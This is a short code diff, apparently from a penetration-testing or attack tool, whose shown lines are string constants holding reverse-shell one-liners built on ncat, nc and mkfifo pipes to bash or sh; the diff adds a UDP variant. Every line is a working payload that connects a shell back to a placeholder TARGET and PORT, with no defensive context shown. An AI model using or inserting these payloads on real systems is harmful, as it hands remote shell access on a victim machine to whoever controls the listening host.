@@ -24,6 +24,7 @@ REVERSE_NCAT = "ncat TARGET PORT -e /bin/bash"
 
 REVERSE_NC_TRADITIONAL_1 = "nc TARGET PORT -c /bin/bash"
 
+REVERSE_NC_UDP_1 = """mkfifo fifo ; nc.traditional -u TARGET PORT < fifo | { bash -i; } > fifo"""
 
 REVERSE_MKFIFO_NC = "if [ -e /tmp/f ]; then rm /tmp/f;fi;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc TARGET PORT > /tmp/f"
 
